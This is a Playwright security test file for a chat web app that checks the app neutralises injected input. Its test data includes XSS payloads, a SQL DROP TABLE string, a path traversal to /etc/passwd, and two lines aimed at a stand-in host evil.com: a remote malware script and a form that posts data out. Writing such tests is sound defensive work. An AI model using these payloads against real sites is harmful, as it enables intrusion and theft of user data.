import { test, expect } from '@playwright/test';
import { ChatPage } from '../page-objects/chat.page';
import { MockBackend } from '../fixtures/mock-backend';

test.describe('Security Tests', () => {
  let chatPage: ChatPage;
  let mockBackend: MockBackend;

  test.beforeEach(async ({ page }) => {
    chatPage = new ChatPage(page);
    mockBackend = new MockBackend(page);
    await chatPage.navigate();
  });

  test.describe('XSS Prevention', () => {
    test('should prevent script injection in chat messages', async ({ page }) => {
      await mockBackend.mockHappyPath();

      // Track if any alert dialog appears (would indicate XSS)
      let alertAppeared = false;
      page.on('dialog', async (dialog) => {
        alertAppeared = true;
        await dialog.dismiss();
      });

      // Try to inject script tag
      await chatPage.sendMessage('<script>alert("XSS")</script>');
      await chatPage.waitForUserMessage();

      // Wait a moment for any potential script execution
      await page.waitForTimeout(1000);

      // No alert should have appeared
      expect(alertAppeared).toBe(false);

      // Check message content
      const userMessage = await chatPage.getLastUserMessage();

      // Script tag should either be escaped or stripped
      // CRITICAL: This test will FAIL with current implementation
      // because [innerHTML] is used without sanitization
      expect(userMessage).not.toContain('<script>');
    });

    test('should prevent event handler injection', async ({ page }) => {
      await mockBackend.mockHappyPath();

      let alertAppeared = false;
      page.on('dialog', async (dialog) => {
        alertAppeared = true;
        await dialog.dismiss();
      });

      // Try various XSS vectors
      const xssVectors = [
        '<img src=x onerror="alert(1)">',
        '<svg onload="alert(1)">',
        '<iframe src="javascript:alert(1)">',
        '<body onload="alert(1)">',
        '<input onfocus="alert(1)" autofocus>',
      ];

      for (const vector of xssVectors) {
        await chatPage.sendMessage(vector);
        await chatPage.waitForUserMessage();
        await page.waitForTimeout(500);

        const userMessage = await chatPage.getLastUserMessage();

        // Should not contain unescaped event handlers
        expect(userMessage).not.toContain('onerror=');
        expect(userMessage).not.toContain('onload=');
        expect(userMessage).not.toContain('onfocus=');

        // Reload to clear messages for next iteration
        await page.reload();
        await chatPage.waitForAngular();
      }

      expect(alertAppeared).toBe(false);
    });

    test('should escape HTML entities in messages', async () => {
      await mockBackend.mockHappyPath();

      const htmlMessage = '<div>Test &amp; special chars: &lt;&gt;&quot;&#39;</div>';
      await chatPage.sendMessage(htmlMessage);
      await chatPage.waitForUserMessage();

      const displayedMessage = await chatPage.getLastUserMessage();

      // HTML should be escaped or text content should be used
      // Should not render as actual HTML elements
      expect(displayedMessage).toBeTruthy();
    });

    test('should prevent CSS injection', async ({ page }) => {
      await mockBackend.mockHappyPath();

      const cssInjection = '<style>body { display: none; }</style>';
      await chatPage.sendMessage(cssInjection);
      await chatPage.waitForUserMessage();

      // Body should still be visible
      const isBodyVisible = await page.locator('body').isVisible();
      expect(isBodyVisible).toBe(true);
    });

    test('should prevent javascript: protocol in links', async ({ page }) => {
      await mockBackend.mockHappyPath();

      const jsLink = '<a href="javascript:alert(1)">Click me</a>';
      await chatPage.sendMessage(jsLink);
      await chatPage.waitForUserMessage();

      // Check if any links with javascript: protocol exist
      const jsLinks = await page.locator('a[href^="javascript:"]').count();
      expect(jsLinks).toBe(0);
    });

    test('should prevent data: URI injection', async ({ page }) => {
      await mockBackend.mockHappyPath();

      const dataUri = '<img src="data:text/html,<script>alert(1)</script>">';
      await chatPage.sendMessage(dataUri);
      await chatPage.waitForUserMessage();

      let alertAppeared = false;
      page.on('dialog', async (dialog) => {
        alertAppeared = true;
        await dialog.dismiss();
      });

      await page.waitForTimeout(1000);
      expect(alertAppeared).toBe(false);
    });
  });

  test.describe('Input Validation', () => {
    test('should handle SQL injection attempts gracefully', async () => {
      await mockBackend.mockHappyPath();

      const sqlInjection = "'; DROP TABLE users; --";
      await chatPage.sendMessage(sqlInjection);
      await chatPage.waitForUserMessage();

      // Should be treated as normal text
      const userMessage = await chatPage.getLastUserMessage();
      expect(userMessage).toBe(sqlInjection);
    });

    test('should handle path traversal attempts', async () => {
      await mockBackend.mockHappyPath();

      const pathTraversal = '../../../etc/passwd';
      await chatPage.sendMessage(pathTraversal);
      await chatPage.waitForUserMessage();

      const userMessage = await chatPage.getLastUserMessage();
      expect(userMessage).toBe(pathTraversal);
    });

    test('should handle extremely long input', async () => {
      await mockBackend.mockHappyPath();

      const longMessage = 'A'.repeat(100000);
      await chatPage.sendMessage(longMessage);
      await chatPage.waitForUserMessage();

      // Should handle without crashing
      const userMessage = await chatPage.getLastUserMessage();
      expect(userMessage.length).toBeGreaterThan(0);
    });

    test('should handle null bytes in input', async () => {
      await mockBackend.mockHappyPath();

      const nullByteMessage = 'Test\x00Message';
      await chatPage.sendMessage(nullByteMessage);
      await chatPage.waitForUserMessage();

      // Should handle gracefully
      const messageCount = await chatPage.getUserMessageCount();
      expect(messageCount).toBeGreaterThan(0);
    });
  });

  test.describe('Session Security', () => {
    test('should use secure session IDs', async () => {
      await chatPage.navigate();

      const sessionId = await chatPage.getSessionId();

      // Session ID should be a UUID (secure random)
      expect(sessionId).toMatch(/^[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}$/);
    });

    test('should not expose sensitive data in localStorage', async ({ page }) => {
      await chatPage.navigate();

      const localStorageData = await page.evaluate(() => {
        return Object.keys(localStorage).reduce((acc, key) => {
          acc[key] = localStorage.getItem(key);
          return acc;
        }, {} as Record<string, string | null>);
      });

      // Check that no passwords or API keys are stored
      const dataString = JSON.stringify(localStorageData).toLowerCase();
      expect(dataString).not.toContain('password');
      expect(dataString).not.toContain('apikey');
      expect(dataString).not.toContain('secret');
      expect(dataString).not.toContain('token'); // except mcp-auth-token
    });

    test('should not leak session data in URL', async ({ page }) => {
      await chatPage.navigate();

      const url = page.url();

      // URL should not contain session ID or sensitive data
      expect(url).not.toMatch(/session.*=/i);
      expect(url).not.toMatch(/token.*=/i);
      expect(url).not.toMatch(/api.*key/i);
    });
  });

  test.describe('CSRF Protection', () => {
    test('should include CSRF headers in requests', async ({ page }) => {
      const requests: any[] = [];

      page.on('request', (request) => {
        if (request.url().includes('/api/chat/message')) {
          requests.push({
            headers: request.headers(),
          });
        }
      });

      await mockBackend.mockHappyPath();
      await chatPage.sendMessage('Test message');
      await chatPage.waitForUserMessage();

      // Wait for request
      await page.waitForTimeout(1000);

      expect(requests.length).toBeGreaterThan(0);

      const headers = requests[0].headers;

      // Should include standard security headers
      expect(headers['content-type']).toContain('application/json');
      expect(headers['x-requested-with']).toBe('XMLHttpRequest');
    });

    test('should include request ID in headers', async ({ page }) => {
      const requests: any[] = [];

      page.on('request', (request) => {
        if (request.url().includes('/api/chat/message')) {
          requests.push({
            headers: request.headers(),
          });
        }
      });

      await mockBackend.mockHappyPath();
      await chatPage.sendMessage('Test message');
      await chatPage.waitForUserMessage();

      await page.waitForTimeout(1000);

      expect(requests.length).toBeGreaterThan(0);

      const headers = requests[0].headers;

      // Should include X-Request-ID
      expect(headers['x-request-id']).toBeTruthy();
    });
  });

  test.describe('Content Security', () => {
    test('should not allow external script loading in messages', async ({ page }) => {
      await mockBackend.mockHappyPath();

      const externalScript = '<script src="https://evil.com/malware.js"></script>';
      await chatPage.sendMessage(externalScript);
      await chatPage.waitForUserMessage();

      // Check that no external scripts were loaded
      const scripts = await page.locator('script[src*="evil.com"]').count();
      expect(scripts).toBe(0);
    });

    test('should not allow form submission from messages', async ({ page }) => {
      await mockBackend.mockHappyPath();

      const formHack = '<form action="https://evil.com/steal" method="POST"><input name="data" value="stolen"></form>';
      await chatPage.sendMessage(formHack);
      await chatPage.waitForUserMessage();

      // Check that no forms with external action exist
      const forms = await page.locator('form[action*="evil.com"]').count();
      expect(forms).toBe(0);
    });

    test('should not execute inline scripts in messages', async ({ page }) => {
      await mockBackend.mockHappyPath();

      let executionDetected = false;

      // Create a global flag that XSS would set
      await page.evaluate(() => {
        (window as any).xssExecuted = false;
      });

      const inlineScript = '<script>window.xssExecuted = true;</script>';
      await chatPage.sendMessage(inlineScript);
      await chatPage.waitForUserMessage();

      await page.waitForTimeout(1000);

      executionDetected = await page.evaluate(() => (window as any).xssExecuted);
      expect(executionDetected).toBe(false);
    });
  });

  test.describe('Security Headers', () => {
    test.skip('should set Content-Security-Policy headers', async ({ page }) => {
      // This test requires backend CSP headers to be configured
      // Skip for now as it's a backend configuration

      const response = await page.goto(chatPage.page.url());
      const headers = response?.headers();

      expect(headers?.['content-security-policy']).toBeTruthy();
    });

    test.skip('should set X-Frame-Options header', async ({ page }) => {
      // This test requires backend security headers
      // Skip for now

      const response = await page.goto(chatPage.page.url());
      const headers = response?.headers();

      expect(headers?.['x-frame-options']).toBe('DENY');
    });
  });

  test.describe('Rate Limiting & DoS Prevention', () => {
    test('should handle rapid message submissions', async () => {
      await mockBackend.mockHappyPath();

      // Try to send multiple messages rapidly
      for (let i = 0; i < 10; i++) {
        await chatPage.typeMessage(`Message ${i}`);
        await chatPage.clickSend();
      }

      // App should remain functional
      await expect(chatPage.messageInput).toBeEnabled();
    });

    test('should handle large payload attempts', async () => {
      await mockBackend.mockHappyPath();

      // Try to send a very large message
      const hugeMessage = 'X'.repeat(1000000); // 1MB message
      await chatPage.sendMessage(hugeMessage);

      // Should handle gracefully (may truncate or reject)
      await expect(chatPage.messageInput).toBeEnabled();
    });
  });
});
